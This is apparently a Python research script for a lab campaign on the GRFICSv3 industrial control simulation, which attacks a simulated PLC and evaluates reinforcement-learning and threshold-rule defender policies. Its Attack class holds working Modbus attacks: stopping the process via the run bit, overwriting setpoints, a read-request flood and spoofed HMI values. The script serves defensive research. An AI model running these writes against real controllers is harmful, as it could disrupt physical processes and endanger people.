"""Revision lab campaign on a fresh GRFICSv3 (PLC program 326339.st, nominal setpoints).

Two phases, one 1 Hz record stream (CSV, appended and flushed every second):

C1c  repeated attack episodes without defence. Each technique (T0813, T0836, T0813+T0836,
     T0814, T0856) is run REPS times in a seeded random order: 90 s normal lead-in,
     ATTACK_S s attack, then restore and recovery until steady state (or 900 s max).
C4a  closed-loop defence. Same attacks; a policy reads the 13 sensors every second, its
     action is written to the PLC, and the process responds:
       0 DO_NOTHING         automatic control (manual mode off, defender run_bit hold released)
       1 OPEN_SAFETY_VALVE  manual mode with purge valve fully open, other valves held at the
                            PLC's current commands (%QX0.0 manual_mode, %QW10-13)
       2 EMERGENCY_SHUTDOWN run_bit (%QX5.0) = FALSE: feeds closed, purge and product open
     Policies: PPO (paper), PPO-pressure (label-free, C4b), threshold rule, always DO_NOTHING.
     Each run: 60 s lead-in (policy active), ATTACK_S s attack, 120 s after the attack
     (policy active), then restore and recovery.

Usage: python3 campaign.py [c1c|c4a|all]
"""
import csv, json, os, random, sys, threading, time
from datetime import datetime, timezone
import numpy as np
from pymodbus.client import ModbusTcpClient

PLC = os.environ.get("PLC_IP", "172.18.0.4")
OUT = "/root/lab/out"; os.makedirs(OUT, exist_ok=True)
ATTACK_S = 300
REPS_C1C = 6
REPS_C4A = 2
NOMINAL_SP = {1025: 30801, 1026: 55295, 1027: 31675, 1028: 28835}
RUN_BIT, MANUAL = 40, 0
FEAT = ["f1_valve", "f1_flow", "f2_valve", "f2_flow", "purge_valve", "purge_flow",
        "prod_valve", "prod_flow", "pressure", "level", "A_purge", "B_purge", "C_purge"]
SCALE = [100, 500, 100, 500, 100, 500, 100, 500, 3200, 100, 100, 100, 100]
TECH = ["T0813", "T0836", "T0813+T0836", "T0814", "T0856"]


def client(timeout=3):
    while True:
        c = ModbusTcpClient(PLC, port=502, timeout=timeout)
        if c.connect():
            return c
        time.sleep(1)


def status(msg):
    line = f"{datetime.now(timezone.utc).isoformat()} {msg}"
    print(line, flush=True)
    with open(f"{OUT}/status.log", "a") as f:
        f.write(line + "\n")


# ---------------------------------------------------------------- attacks
class Attack(threading.Thread):
    """Runs one technique until stop is set. Mirrors grfics_attacks.py / attack_combined_apt.py."""
    def __init__(self, tech):
        super().__init__(daemon=True); self.tech = tech; self.stop = threading.Event()

    def run(self):
        if self.tech == "T0814":
            def flood():
                while not self.stop.is_set():
                    try:
                        fc = ModbusTcpClient(PLC, port=502, timeout=0.1); fc.connect()
                        fc.read_input_registers(address=200, count=50)
                        fc.read_holding_registers(address=0, count=50)
                        fc.read_coils(address=0, count=100); fc.close()
                    except Exception:
                        pass
            ws = [threading.Thread(target=flood, daemon=True) for _ in range(3)]
            [w.start() for w in ws]; [w.join() for w in ws]; return
        c = client()
        while not self.stop.is_set():
            try:
                if "T0813" in self.tech:
                    c.write_coil(address=RUN_BIT, value=False)
                if "T0836" in self.tech:
                    c.write_register(address=1026, value=65535)
                    c.write_register(address=1027, value=65535)
                    c.write_register(address=1028, value=0)
                if self.tech == "T0856":
                    for a, v in [(1044, 800), (1045, 50), (1047, 0), (1049, 0), (1051, 0), (1053, 0)]:
                        c.write_register(address=a, value=v)
            except Exception:
                c.close(); c = client()
            self.stop.wait(1.0)
        c.close()


def restore(c):
    for a, v in NOMINAL_SP.items():
        c.write_register(address=a, value=v)
    c.write_registers(address=1044, values=[0] * 10)
    c.write_coil(address=MANUAL, value=False)
    c.write_coil(address=RUN_BIT, value=True)


# ---------------------------------------------------------------- recording
class Recorder:
    COLS = (["utc", "phase", "episode", "technique", "policy", "segment", "t_seg", "read_ok", "latency_ms"]
            + FEAT + [f"raw_{f}" for f in FEAT]
            + ["sp_a", "sp_pressure", "sp_override", "sp_level", "cmd_f1", "cmd_f2", "cmd_purge", "cmd_prod",
               "hmi_pressure", "hmi_level", "run_bit", "manual_mode", "action"])

    def __init__(self, path):
        new = not os.path.exists(path)
        self.f = open(path, "a", newline=""); self.w = csv.writer(self.f)
        if new:
            self.w.writerow(self.COLS)
        self.c = client(timeout=2)

    def read(self):
        t0 = time.time()
        try:
            ir = self.c.read_input_registers(address=100, count=13)
            hr = self.c.read_holding_registers(address=1025, count=4)
            q = self.c.read_holding_registers(address=100, count=4)
            hmi = self.c.read_holding_registers(address=1044, count=2)
            co = self.c.read_coils(address=0, count=41)
            if any(r.isError() for r in (ir, hr, q, hmi, co)):
                raise IOError
            lat = 1000 * (time.time() - t0)
            raw = ir.registers
            phys = [round(r / 65535 * s, 4) for r, s in zip(raw, SCALE)]
            return dict(ok=1, lat=lat, phys=phys, raw=raw, hr=hr.registers, q=q.registers,
                        hmi=hmi.registers, run_bit=int(co.bits[40]), manual=int(co.bits[0]))
        except Exception:
            try:
                self.c.close()
            except Exception:
                pass
            self.c = client(timeout=2)
            return dict(ok=0, lat=1000 * (time.time() - t0))

    def write(self, meta, s, action=""):
        if s["ok"]:
            row = (meta + [1, round(s["lat"], 1)] + s["phys"] + s["raw"] + s["hr"] + s["q"] + s["hmi"]
                   + [s["run_bit"], s["manual"], action])
        else:
            row = meta + [0, round(s["lat"], 1)] + [""] * (len(self.COLS) - len(meta) - 3) + [action]
        self.w.writerow([datetime.now(timezone.utc).isoformat()] + row); self.f.flush()


def steady(rec, meta_fn, max_s=900, hold=45):
    """Record until pressure and level stay within a band of nominal for `hold` s."""
    ok_run, t = 0, 0
    while t < max_s:
        s = rec.read(); rec.write(meta_fn(t), s); t += 1
        if s["ok"] and abs(s["phys"][8] - 2700) < 25 and 30 < s["phys"][9] < 60:
            ok_run += 1
        else:
            ok_run = 0
        if ok_run >= hold:
            return t
        time.sleep(1)
    return t


# ---------------------------------------------------------------- C1c
def run_c1c(rec):
    rng = random.Random(42)
    order = [t for t in TECH for _ in range(REPS_C1C)]; rng.shuffle(order)
    done = set()
    if os.path.exists(f"{OUT}/c1c_done.json"):
        done = set(json.load(open(f"{OUT}/c1c_done.json")))
    for ep, tech in enumerate(order):
        if ep in done:
            continue
        status(f"C1c episode {ep} {tech} start")
        mk = lambda seg: (lambda t: ["c1c", ep, tech, "none", seg, t])
        for t in range(90):
            rec.write(mk("normal")(t), rec.read()); time.sleep(1)
        atk = Attack(tech); atk.start()
        for t in range(ATTACK_S):
            rec.write(mk("attack")(t), rec.read()); time.sleep(1)
        atk.stop.set(); atk.join(10)
        c = client(); restore(c); c.close()
        rt = steady(rec, mk("recovery"))
        done.add(ep); json.dump(sorted(done), open(f"{OUT}/c1c_done.json", "w"))
        status(f"C1c episode {ep} {tech} end, recovery {rt} s")


# ---------------------------------------------------------------- C4a
def load_policies():
    import joblib
    from stable_baselines3 import PPO
    sc = joblib.load("/root/lab/models/scaler_grfics_live.pkl")
    norm = lambda phys: sc.transform(np.asarray([phys], dtype=np.float32))[0].astype(np.float32)
    ppo = PPO.load("/root/lab/models/rl_defender_grfics.zip", device="cpu")
    ppo_p = PPO.load("/root/lab/models/PPO-pressure.zip", device="cpu")
    return norm, {
        "PPO (paper)": lambda o: int(ppo.predict(o, deterministic=True)[0]),
        "PPO-pressure": lambda o: int(ppo_p.predict(o, deterministic=True)[0]),
        "Threshold rule": lambda o: 1 if o[8] >= 0.90 else 0,
        "DO_NOTHING": lambda o: 0,
    }


class Actuator:
    def __init__(self):
        self.c = client(); self.last = 0

    def apply(self, a, s):
        try:
            if a == 1:
                if s.get("ok"):
                    q = s["q"]; self.c.write_registers(address=10, values=[q[0], q[1], 65535, q[3]])
                self.c.write_coil(address=MANUAL, value=True)
                if self.last == 2:
                    self.c.write_coil(address=RUN_BIT, value=True)
            elif a == 2:
                self.c.write_coil(address=RUN_BIT, value=False)
            else:
                if self.last == 1:
                    self.c.write_coil(address=MANUAL, value=False)
                if self.last == 2:
                    self.c.write_coil(address=RUN_BIT, value=True)
            self.last = a
        except Exception:
            self.c.close(); self.c = client()


def run_c4a(rec):
    norm, pols = load_policies()
    rng = random.Random(7)
    runs = []
    for rep in range(REPS_C4A):
        block = [(t, p) for t in TECH for p in pols]; rng.shuffle(block)
        runs += [(rep, t, p) for t, p in block]
    done = set()
    if os.path.exists(f"{OUT}/c4a_done.json"):
        done = set(json.load(open(f"{OUT}/c4a_done.json")))
    # RERUN="9,15": repeat runs whose PLC crashed mid-run; the PLC container is restarted
    # before each repeat and the repeat is recorded under episode id "<i>r"
    rerun = [int(x) for x in os.environ.get("RERUN", "").split(",") if x.strip()]
    for i, (rep, tech, pname) in enumerate(runs):
        if rerun:
            if i not in rerun:
                continue
            os.system("docker restart plc > /dev/null"); time.sleep(40)
            steady(rec, lambda t: ["settle", -1, "none", "none", "settle", t])
        elif i in done:
            continue
        ep_id = f"{i}r" if rerun else i
        status(f"C4a run {ep_id} rep{rep} {tech} {pname} start")
        pol = pols[pname]; act = Actuator(); atk = None
        mk = lambda seg: (lambda t: ["c4a", ep_id, tech, pname, seg, t])
        plan = [("lead", 60), ("attack", ATTACK_S), ("post", 120)]
        a = 0
        for seg, dur in plan:
            if seg == "attack":
                atk = Attack(tech); atk.start()
            if seg == "post":
                atk.stop.set(); atk.join(10)   # attacker's last writes persist until the restore below
            for t in range(dur):
                s = rec.read()
                if s["ok"]:
                    a = pol(norm(s["phys"]))
                act.apply(a, s)
                rec.write(mk(seg)(t), s, a); time.sleep(1)
        act.apply(0, {}); act.c.close()
        c = client(); restore(c); c.close()
        rt = steady(rec, mk("recovery"))
        if not rerun:
            done.add(i); json.dump(sorted(done), open(f"{OUT}/c4a_done.json", "w"))
        status(f"C4a run {ep_id} end, recovery {rt} s")


if __name__ == "__main__":
    what = sys.argv[1] if len(sys.argv) > 1 else "all"
    c = client(); restore(c); c.close()
    rec = Recorder(f"{OUT}/lab_campaign.csv")
    status(f"campaign {what} start; settling")
    steady(rec, lambda t: ["settle", -1, "none", "none", "settle", t])
    if what in ("c1c", "all"):
        run_c1c(rec)
    if what in ("c4a", "all"):
        run_c4a(rec)
    status("ALL DONE")
